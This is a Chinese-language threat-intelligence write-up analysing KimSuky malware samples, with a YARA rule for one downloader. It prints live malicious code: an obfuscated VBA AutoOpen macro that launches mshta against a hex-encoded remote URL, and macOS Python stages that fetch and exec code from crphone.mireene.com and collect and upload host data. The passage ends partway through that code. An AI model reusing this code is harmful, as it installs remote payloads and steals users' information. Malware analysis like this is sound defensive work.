下载回来。  
两个文件结构基本相同
程序会尝试读取解密名为JUYFON的资源文件，该资源名跟笔者前段时间分析的一例KimSuky资源名相同，于是找到了原样本跟此样本进行对比，发现是同一版本的木马。
这里的JUYFON实际上是一个诱惑用户的文档，程序会读取并打开该文档，迷惑用户。
接着收集本地的一些信息写入到docx文档中
最后通过CreateThread方法启动一个新线程，将数据上传到C2服务器。
直接将资源dump出来，可以看到两个资源都是hwp的文档，并且两个文档所描述的主题一致，应该是一起攻击中的不同攻击载荷。
而根据之前的分析，该exe其实是一个downloader，后续会下载一个dll到本地继续执行，但目前为止，还没有及时下载到后续的dll文件。
由于在VT上找不到这个dll，笔者又将目标投入到搜索引擎，在google中将请求路径和KimSuky作为关键字组合搜索后，在得到的结果中筛选了如下一篇分析报告：
报告中的请求路径与该exe的请求路径基本符合，且在文末给出了dll文件的md5。通过查询报告中给的域名，得到了与之前分析相同的域：185.176.43.84，这里基本可以确定报告中的dll就是这里断链的文件。
###  报告中的第二阶段exe分析
该exe
的WinMain很简单，首先是创建互斥体，然后是通过一个线程循环查找gswin32c.exe的窗口句柄，接着初始化一些需要使用的API，最后创建一个线程执行关键功能。
创建的sub_402660线程虽然代码结构和笔者之前分析的不相同，但是功能基本保持一致。都是收集信息写入文件上传，然后下载文件到本地
这里下载的文件就是zyx.dll。
可以推算，该样本应该是KimSuky第二阶段早期的Downloader，笔者上次分析的应该是第二阶段新版本的Downloader。因为该样本并不具备读取资源打开迷惑用户的功能。且代码结构相对比较简单。
因此，这里下载回来的zyx.dll 即使跟我们想要找的有所出入，但也应该是早期版本。
下载回来发现是VMP保护的，分析不动，于是放弃。
补充一个针对exe的downloader的简单yara规则,主要是靠WebKitFormBoundarywhpFxMBe19cSjFnG进行识别
    rule KimSuky_Downloader
    {
        meta:
            description = "pe dowbnloader"
            author = "p1ut0"
            date = "2020-10-12"
            reference = "https://twitter.com/cyberwar_15/status/1315160377156460544"
            hash = "ffff18fc7c2166c2a1a3c3d8bbd95ba1"
        strings:
            $url_string1 = "WebKitFormBoundarywhpFxMBe19cSjFnG"   fullword ascii
            $file_op1 = "/c systeminfo >> %s" fullword ascii
            $file_op3 = "/c dir %s\\ >> %s" fullword ascii
            $file_op2 = "\\Microsoft\\HNC"   fullword ascii
            $file_resName  = "JUYFON"
        condition:
            (
                uint16(0) == 0x5A4D
            )
            and
            (
                $url_string1
            )
            and 
            (
                3 of ($file_*) 
            )
    }
###  附带hta的doc样本分析
样本md5：A9DAC36EFD7C99DC5EF8E1BF24C2D747  
该doc是2月份KimSuky利用疫情对韩国进行网络攻击的样本。红雨滴在 [COVID-19 |
新冠病毒笼罩下的全球疫情相关网络攻击分析报告](https://twitter.com/cyberwar_15/status/1232989735011794945)中对该样本有概要的分析。
使用olevba分析下样本的宏代码如下：
olevba分析到了一个完整的请求路径
dump出来的完整vba代码如下
    Const wwfxmpquap = 0
    Private Function uvwycgyhqtmt(ByVal zjkvoxjeyiqc As String) As String
    Dim tkwzqharcnkh As Long
    For tkwzqharcnkh = 1 To Len(zjkvoxjeyiqc) Step 2
    uvwycgyhqtmt = uvwycgyhqtmt & Chr$(Val("&H" & Mid$(zjkvoxjeyiqc, tkwzqharcnkh, 2)))
    Next tkwzqharcnkh
    End Function
    Sub psjmjmntntn(kmsghjrsxteynvkbz As String)
    With CreateObject(uvwycgyhqtmt("5753637269") & uvwycgyhqtmt("70742e5368656c6c"))
    .Run kmsghjrsxteynvkbz, wwfxmpquap, True
    End With
    End Sub
    Sub AutoOpen()
    With ActiveDocument.Background.Fill
    .ForeColor.RGB = RGB(255, 255, 255)
    .Visible = msoTrue
    .Solid
    End With
    Selection.WholeStory
    Content = uvwycgyhqtmt("6d7368746120687474703a2f2f766e6578742e6d697265") & uvwycgyhqtmt("656e652e636f6d2f7468656d652f62617369632f736b696e2f6d656d6265722f62617369632f75706c6f61642f7365617263682e687461202f66")
    Selection.Font.Hidden = False
    psjmjmntntn (Content)
    Selection.Collapse
    ActiveDocument.Save
    End Sub
这里很明显uvwycgyhqtmt是解密函数，解密函数的定义在vba代码最上面
解密出在olevba里面看到的下载地址
然后在psjmjmntntn函数中通过Wscript.Shell调用mshta 执行后面的代码下载后续payload到本地继续执行。
Search.hta文件下载之后将再次获取hta文件执行：
这里再次下载的文件是包含了恶意VBS的hta。
该hta文件将实现收集本地主机基本信息包括主机名、用户名、ip、遍历磁盘、进程list等并创建计划任务定时获取命令执行：  
在此样本的分析中，KimSuky主要是通过宏下载执行hta文件，通过该hta文件继续下载并执行包含了恶意VBS的hta文件。
以该样本的请求主域名vnext.mireene.com作为关键字进行查询可以得到如下信息：
mireene是韩国地区的一个托管域名机构。属于第三方域名，所以只能对已经出现的与KimSuky样本通信的mireene进行关联，不能直接与该主域关联。
###  针对macOS的doc样本分析
在分析上一个样本搜搜vnext.mireene.com域名的时候，在Twitter的评论中还看到了另外一个关联的样本：
样本MD5为a4388c4d0588cd3d8a607594347663e0，在Twitter的发布时间是3月19日，C2:crphone.mireene[.]com
原始的doc文件是一个包含了2017-0199远程模板注入漏洞的恶意文档，文档打开时，会尝试从  
下载注入的文档
注入的文件是一个带有宏代码的doc文档，该宏执行后，先是会在原始文档中显示诱饵文字，降低用户的防备心。
接着判断当前系统是否为macos，如果是，VBA则会通过管道执行python代码并从指定的地址下载文件加载执行。
通过github找到了对应的python代码  
下载回来的python代码功能比较简单，本质还是一个downloader，用于下载后续的payload
    ## contents of http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v1:
    import os;
    import posixpath;
    home_dir = posixpath.expandvars("$HOME");
    normal_dotm = home_dir + "/../../../Group Containers/UBF8T346G9.Office/User Content.localized/Templates.localized/normal.dotm"
    os.system("rm -f '" + normal_dotm + "'");
    fd = os.open(normal_dotm,os.O_CREAT | os.O_RDWR);
    import urllib2;
    data = urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=normal')).read()
    os.write(fd, data);
    os.close(fd)
    exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v60')).read())
下载的后续payload依旧是python文件，代码如下
    ## contents of http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v60
    import os
    import posixpath
    import time
    import urllib2
    import threading
    from httplib import *
    def CollectData():
        #create work directory
        home_dir = posixpath.expandvars("$HOME")
        workdir = home_dir + "/../../../Group Containers/UBF8T346G9.Office/sync"
        os.system("mkdir -p '" + workdir + "'")
        #get architecture info
        os.system("python -c 'import platform;print(platform.uname())' >> '" + workdir + "/arch.txt'")
        #get systeminfo
        os.system("system_profiler -detailLevel basic >> '" + workdir + "/basic.txt'")
        #get process list
        #os.system("ps -ax >> '" + workdir + "/ps.txt'")
        #get using app list
        os.system("ls -lrS /Applications >> '" + workdir + "/app.txt'")
        #get documents file list
        os.system("ls -lrS '" + home_dir + "/documents' >> '" + workdir + "/documents.txt'")
        #get downloads file list
        os.system("ls -lrS '" + home_dir + "/downloads' >> '" + workdir + "/downloads.txt'")
        #get desktop file list
        os.system("ls -lrS '" + home_dir + "/desktop' >> '" + workdir + "/desktop.txt'")
        #get volumes info
        os.system("ls -lrs /Volumes >> '" + workdir + "/vol.txt'")
        #get logged on user list
        #os.system("w -i >> '" + workdir + "/w_i.txt'")
        #zip gathered informations
        zipname = home_dir + "/../../../Group Containers/UBF8T346G9.Office/backup.zip"
        os.system("rm -f '" + zipname + "'")
        zippass = "doxujoijcs0qei09213@#$@"
        zipcmd = "zip -m -r '" + zipname + "' '" + workdir + "'"
        print(zipcmd)
        os.system(zipcmd)
        try:
            BODY = open(zipname, mode='rb').read()
            headers = {"User-Agent" : "Mozilla/5.0 compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0", "Accept-Language" : "en-US,en;q=0.9", "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Content-Type" : "multipart/form-data; boundary=----7e222d1d50232"} ;
            boundary = "----7e222d1d50232";
            postData = "--" + boundary + "\r\nContent-Disposition: form-data; name=""MAX_FILE_SIZE""\r\n\r\n1000000\r\n--" + boundary + "\r\nContent-Disposition: form-data; name=""file""; filename=""1.txt""\r\nContent-Type: text/plain\r\n\r\n" + BODY + "\r\n--" + boundary + "--";
            conn = HTTPConnection("crphone.mireene.com")